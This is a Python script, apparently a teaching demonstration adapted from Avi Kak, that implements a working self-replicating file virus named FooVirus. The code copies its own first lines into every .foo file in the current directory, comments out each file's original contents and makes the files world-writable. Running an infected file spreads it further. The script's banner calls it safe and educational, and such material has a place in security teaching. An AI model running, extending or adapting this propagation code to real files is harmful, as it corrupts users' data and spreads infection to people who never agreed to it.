#!/usr/bin/env python3
import sys
import os
import glob

## FooVirus.py (Python 3 version)
## Original Author: Avi Kak
## Updated for Python 3

print("\nHELLO FROM FooVirus\n")

print("This is a demonstration of how easy it is to write")
print("a self-replicating program. This virus will infect")
print("all files whose names end in .foo in the directory")
print("in which you execute an infected file. If you send an")
print("infected file to someone else and they execute it,")
print("their .foo files will be damaged also.\n")

print("Note that this is a safe virus and it is for educational")
print("purposes only. The virus does not carry a harmful payload.")
print("All it does is to print out this message and comment out")
print("the code in .foo files.\n")


# 🔹 Read its own code (first 37 lines)
with open(sys.argv[0], 'r') as IN:
    virus = [line for i, line in enumerate(IN) if i < 37]


# 🔹 Infect all .foo files in current directory
for item in glob.glob("*.foo"):
    print("Processing:", item)

    with open(item, 'r') as IN:
        all_of_it = IN.readlines()

    # Correct infection check
    if any('foovirus' in line.lower() for line in all_of_it):
        print("Already infected:", item)
        continue

    # 🔹 Change permissions (Python 3 fix)
    os.chmod(item, 0o777)

    # 🔹 Infect file
    with open(item, 'w') as OUT:
        OUT.writelines(virus)

        # Comment out original content
        all_of_it = ['# ' + line for line in all_of_it]
        OUT.writelines(all_of_it)

    print("Infected:", item)
